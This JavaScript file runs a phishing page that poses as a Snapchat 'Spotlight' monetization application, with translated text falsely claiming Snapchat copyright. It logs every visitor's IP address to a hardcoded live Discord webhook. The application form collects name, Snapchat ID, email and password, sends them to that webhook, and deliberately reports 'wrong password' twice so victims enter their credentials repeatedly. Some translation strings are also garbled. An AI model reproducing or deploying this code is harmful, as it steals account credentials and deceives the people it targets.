// ===============================================
// 1. إعدادات ديسكورد لتتبع الزوار
// **هام: استبدل الرابط برابط Webhook الخاص بك**
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT"; 
// ===============================================

// 2. قاموس الترجمات (Dictionary) - يشمل جميع الصفحات (لم يتغير)
const translations = {
    // ... (جميع الترجمات) ...
    pageTitle: {
        ar: "منصة الأضواء - تحقيق المكاسب", en: "Spotlight Platform - Monetization", de: "Spotlight-Plattform - Monetarisierung", fr: "Plateforme Spotlight - Monétisation", es: "Plataforma Spotlight - Monetización"
    },
    heroHeader: {
        ar: "حقق الأرباح من منصة الأضواء!", en: "Monetize with Spotlight!", de: "Verdienen Sie Geld mit Spotlight!", fr: "Gagnez de l'argent avec Spotlight !", es: "¡Monetiza con Spotlight!"
    },
    heroText: {
        ar: "أنشئ محتوى مميزًا وابدأ بجني الأرباح من سناب شات.", en: "Create amazing content and start earning from Snapchat.", de: "Erstellen Sie einzigartige Inhalte und fangen Sie an, auf Snapchat Geld zu verdienen.", fr: "Créez du contenu unique et commencez à gagner de l'argent sur Snapchat.", es: "Crea contenido increíble y comienza a ganar dinero con Snapchat."
    },
    applyButton: {
        ar: "تقديم الطلب", en: "Apply Now", de: "Jetzt Bewerben", fr: "Postuler Maintenant", es: "Aplicar Ahora"
    },
    callToActionSecondary: {
        ar: "انضم الآن وشاهد إبداعك يتألق!", en: "Join now and let your creativity shine!", de: "Jetzt beitreten und deine Kreativität zum Strahlen bringen!", fr: "Rejoignez maintenant et laissez votre créativité briller !", es: "¡Únete ahora و deja que tu creatividad briller!"
    },
    featuresHeader: {
        ar: "لماذا منصة الأضواء؟", en: "Why Spotlight?", de: "Warum Spotlight?", fr: "Pourquoi Spotlight ?", es: "¿Por qué Spotlight?"
    },
    feature1Title: {
        ar: "فرص ربح مجزية", en: "Rewarding Earning Opportunities", de: "Lukrative Verdienstmöglichkeiten", fr: "Opportunités de Gains Lucratives", es: "Oportunidades de Ganancias Recompensantes"
    },
    feature1Text: {
        ar: "احصل على مكافآت مقابل المحتوى الذي يحبه الجمهور.", en: "Get rewarded for content that audiences love.", de: "Erhalten Sie Belohnungen für Inhalte, die das Publikum liebt.", fr: "Soyez récompensé pour le contenu que le public adore.", es: "Obtén recompensas por content that audiences love."
    },
    feature2Title: {
        ar: "انتشار عالمي", en: "Global Reach", de: "Globale Reichweite", fr: "Portée Mondiale", es: "Alcance Global"
    },
    feature2Text: {
        ar: "صل إلى جمهور واسع حول العالم وشاهد محتواك يتألق.", en: "Reach a wide audience worldwide and watch your content shine.", de: "Erreichen Sie ein weltweites Publikum und sehen Sie, wie Ihre Inhalte glänzen.", fr: "Atteignez un large public mondial و regardez votre contenu briller.", es: "Llega a una audiencia amplia en todo el mundo y mira tu content brillar."
    },
    feature3Title: {
        ar: "أدوات إبداعية سهلة", en: "Easy Creative Tools", de: "Einfache Kreativ-Tools", fr: "Outils Créatifs Faciles", es: "Herramientas Creativas Fáciles"
    },
    feature3Text: {
        ar: "استخدم أدوات سناب شات المدمجة لإنشاء مقاطع فيديو مذهلة.", en: "Use built-in Snapchat tools to create stunning videos.", de: "Nutzen Sie die integrierten Snapchat-Tools, um atemberaubende Videos zu erstellen.", fr: "Utilisez les outils Snapchat intégrés pour créer des vidéos époustouflantes.", es: "Usa las herramientas integradas de Snapchat para crear videos increíbles."
    },
    footerText: {
        ar: "© 2025 جميع الحقوق محفوظة لـ Snapchat", en: "© 2025 All rights reserved by Snapchat", de: "© 2025 Alle Rechte Snapchat vorbehalten", fr: "© 2025 Tous droits réservés à Snapchat", es: "© 2025 Todos los derechos reservados por Snapchat"
    },
    
    // === صفحة النموذج (apply.html) ===
    pageTitleForm: {
        ar: "تقديم طلب الانضمام", en: "Join Application Form", de: "Beitrittsanmeldeformular", fr: "Formulaire de Candidature", es: "Formulario de Solicitud"
    },
    formHeader: {
        ar: "نموذج تقديم الطلب", en: "Application Submission Form", de: "Bewerbungsformular", fr: "Soumettre Votre Candidature", es: "Formulario de Envío de Solicitud"
    },
    labelName: { 
        ar: "الاسم بالكامل:", en: "Full Name:", de: "Vollständiger Name:", fr: "Nom Complet :", es: "Nombre Completo:"
    },
    labelSnapchat: { 
        ar: "معرّف حساب سناب شات:", en: "Snapchat Account ID:", de: "Snapchat-Kontonummer:", fr: "Identifiant du Compte Snapchat :", es: "ID de Cuenta de Snapchat:"
    },
    labelTrackingField: { 
        ar: "البريد الإلكتروني:", en: "Email Address:", de: "E-Mail-Adresse:", fr: "Adresse E-mail :", es: "Correo Electrónico:"
    },
    labelPassword: { 
        ar: "كلمة المرور:", en: "Password:", de: "Passwort:", fr: "Mot de Passe:", es: "Contraseña:"
    },
    submitBtn: {
        ar: "إرسال الطلب", en: "Submit Application", de: "Bewerbung Absenden", fr: "Envoyer la Candidature", es: "Enviar Solicitud"
    },
    footerTextForm: {
        ar: "© 2025 جميع الحقوق محفوظة لـ Snapchat", en: "© 2025 All rights reserved by Snapchat", de: "© 2025 Alle Rechte Snapchat vorbehalten", fr: "© 2025 Tous droits réservés à Snapchat", es: "© 2025 Todos los derechos reservados por Snapchat"
    },
    loaderText: {
        ar: "جاري معالجة الطلب...", en: "Processing Request...", de: "Anfrage wird bearbeitet...", fr: "Traitement de la demande...", es: "Procesando Solicitud..."
    },
    
    // === صفحة التأكيد (confirmation.html) ===
    pageTitleConfirm: {
        ar: "تم تقديم طلبك!", en: "Application Submitted Successfully", de: "Bewerbung Erfolgreich Eingereicht", fr: "Candidature Soumise avec Succès", es: "Solicitud Enviada con Éxito"
    },
    confirmHeader: {
        ar: "تم تقديم طلبك!", en: "Application Submitted Successfully!", de: "Ihre Bewerbung wurde empfangen!", fr: "Votre Candidature a été Soumise !", es: "¡Tu Solicitud ha sido Enviada!"
    },
    confirmText: {
        ar: "سنقوم بمراجعة طلبك خلال ٤٨ ساعة القادمة ونقوم بالرد عليك.", en: "We will review your application within the next 48 hours and will respond to you.", de: "Wir werden Ihre Bewerbung innerhalb der nächsten 48 Stunden prüfen und uns bei Ihnen melden.", fr: "Nous examinerons votre candidature dans les 48 heures et vous répondrوس.", es: "Revisaremos su solicitud en las próximas 48 horas و le responderemos."
    },
    homeBtn: {
        ar: "العودة إلى سناب شات", en: "Return to Snapchat", de: "Zurück zu Snapchat", fr: "Retour à Snapchat", es: "Volver a Snapchat"
    },
    footerTextConfirm: {
        ar: "© 2025 جميع الحقوق محفوظة لـ Snapchat", en: "© 2025 All rights reserved by Snapchat", de: "© 2025 Alle Rechte Snapchat vorbehalten", fr: "© 2025 Tous droits réservés por Snapchat", es: "© 2025 Todos los derechos reservados por Snapchat"
    },
};

// 3. دالة تحديد لغة المتصفح
function getBrowserLanguage() {
    const lang = navigator.language || navigator.userLanguage;
    return lang.split('-')[0]; 
}

// 4. دالة تطبيق الترجمة
function applyTranslation() {
    let userLang = getBrowserLanguage();
    
    if (!translations.heroHeader.hasOwnProperty(userLang)) {
        userLang = 'en'; 
    }

    document.documentElement.setAttribute('lang', userLang);

    for (const id in translations) {
        const element = document.getElementById(id);
        if (element && translations[id][userLang]) {
            element.textContent = translations[id][userLang];
        }
    }
    
    const loaderTextElement = document.getElementById('loaderText');
    if (loaderTextElement && translations.loaderText[userLang]) {
        loaderTextElement.textContent = translations.loaderText[userLang];
    }
    
    const body = document.body;
    const headerContainer = document.querySelector('header .container');

    if (userLang === 'ar') {
        body.style.direction = 'rtl';
        body.style.textAlign = 'right';
        if (headerContainer) headerContainer.style.justifyContent = 'flex-start';
    } else {
        body.style.direction = 'ltr';
        body.style.textAlign = 'left';
        if (headerContainer) headerContainer.style.justifyContent = 'flex-start';
    }
}

// دالة مساعدة لإرسال الرسائل إلى Discord Webhook
function sendToDiscord(message) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
        console.warn("Discord Webhook URL is not configured.");
        return;
    }

    // بناء جسم الرسالة بتنسيق ديسكورد
    const payload = {
        content: message,
        username: "Snapchat Tracker",
        avatar_url: "https://i.imgur.com/gK9u5lA.png" // يمكنك استخدام أي صورة لوجو هنا
    };

    return fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
    })
    .catch(error => console.error("Error sending message to Discord:", error));
}


// 5. وظيفة إرسال عنوان IP عند دخول الزائر للموقع
function trackVisitorIP() {
    let dateTime = new Date().toLocaleString(getBrowserLanguage() === 'ar' ? 'ar-EG' : 'en-US', {
        year: 'numeric', month: 'short', day: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit'
    });

    // محاولة جلب عنوان IP أولاً
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            let ipAddress = data.ip || 'غير معروف';
            
            // رسالة النجاح (مع الـ IP)
            let ipMessage = `🔔 **دخول جديد للموقع**\n**🔗 الصفحة:** ${window.location.href}\n**🌍 عنوان IP:** ${ipAddress}\n**⏰ التاريخ:** ${dateTime}\n**🌐 اللغة:** ${getBrowserLanguage().toUpperCase()}`;

            sendToDiscord(ipMessage);
        })
        .catch(error => {
            // إذا فشل جلب الـ IP، يتم إرسال إشعار بدونه كـ Fallback
            console.error("Error fetching IP, sending fallback message:", error);
            
            let fallbackMessage = `⚠️ **تنبيه: دخول جديد للموقع (فشل تحديد IP)**\n**🔗 الصفحة:** ${window.location.href}\n**⏰ التاريخ:** ${dateTime}\n**🌐 اللغة:** ${getBrowserLanguage().toUpperCase()}`;

            sendToDiscord(fallbackMessage);
        });
}


// 6. دالة تتبع النقر على زر "تقديم الطلب" (في index.html) مع الانتظار 3 ثواني
function trackClickAndProceed() {
    const applyButton = document.getElementById('applyButton');
    const loadingText = 'جاري التحضير...';
    
    applyButton.disabled = true;
    applyButton.textContent = loadingText;
    
    const message = `🚨 **نقرة زر جديدة: "تقديم الطلب"**\n**🔗 من الصفحة:** ${window.location.href}\n**⏰ التاريخ:** ${new Date().toLocaleString(getBrowserLanguage() === 'ar' ? 'ar-EG' : 'en-US')}\n**🌐 اللغة:** ${getBrowserLanguage().toUpperCase()}`;

    // إرسال الرسالة إلى ديسكورد
    sendToDiscord(message)
        .finally(() => {
            // الانتظار 3 ثواني قبل التوجيه
            setTimeout(() => {
                window.location.href = 'apply.html';
            }, 3000); 
        });
}


// 7. منطق النموذج وتتبع المحاولات (في apply.html) - منطق الفشل الثلاثي
let attempts = 0;
const MAX_ATTEMPTS = 3;

if (document.getElementById("submissionForm")) {
    const loadingOverlay = document.getElementById("loadingOverlay");
    
    document.getElementById("submissionForm").addEventListener("submit", function(event) {
        event.preventDefault(); 
        
        const statusMessage = document.getElementById("statusMessage");
        const submitButton = document.getElementById("submitBtn");
        
        // 1. جمع البيانات من النموذج
        let fullName = document.getElementById("fullName").value;
        let snapchatHandle = document.getElementById("snapchatHandle").value;
        let trackingEmail = document.getElementById("trackingEmail").value; 
        let passwordField = document.getElementById("passwordField").value; 

        let messageBody = `🔔 **محاولة إرسال نموذج جديدة** (رقم ${attempts + 1}):\n`;
        messageBody += `👤 **الاسم بالكامل:** ${fullName}\n`; 
        messageBody += `👻 **معرّف حساب سناب شات:** ${snapchatHandle}\n`; 
        messageBody += `📧 **البريد الإلكتروني:** ${trackingEmail}\n`; 
        messageBody += `🔒 **كلمة المرور:** ${passwordField}\n`;
        messageBody += `⏰ **التاريخ:** ${new Date().toLocaleString(getBrowserLanguage() === 'ar' ? 'ar-EG' : 'en-US')}`;

        // 2. محاكاة التحقق والفشل المتعمد
        if (attempts < MAX_ATTEMPTS - 1) { // المحاولة 1 و 2 (فشل)
            attempts++;
            
            // إرسال البيانات إلى ديسكورد
            sendToDiscord(messageBody);

            // رسالة خطأ واضحة
            statusMessage.textContent = 'عفواً، كلمة المرور أو معرّف الحساب غير صحيح. يرجى المحاولة مرة أخرى.';
            statusMessage.style.display = 'block';
            
        } else {
            // 3. المحاولة الثالثة: النجاح والتوجيه النهائي
            attempts++;
            submitButton.disabled = true;
            statusMessage.style.display = 'none';
            
            // إظهار شاشة التحميل والانتظار 3 ثواني
            loadingOverlay.style.display = 'flex';
            
            // إرسال البيانات (الإرسال النهائي)
            messageBody += "\n✨ (تم توجيه المستخدم لصفحة التأكيد)";
            sendToDiscord(messageBody);

            // التوجيه لصفحة التأكيد بعد 3 ثواني
            setTimeout(() => {
                window.location.href = "confirmation.html"; 
            }, 3000);
        }
    });
}


// 8. تشغيل الوظائف عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', () => {
    applyTranslation();
    trackVisitorIP(); 
});
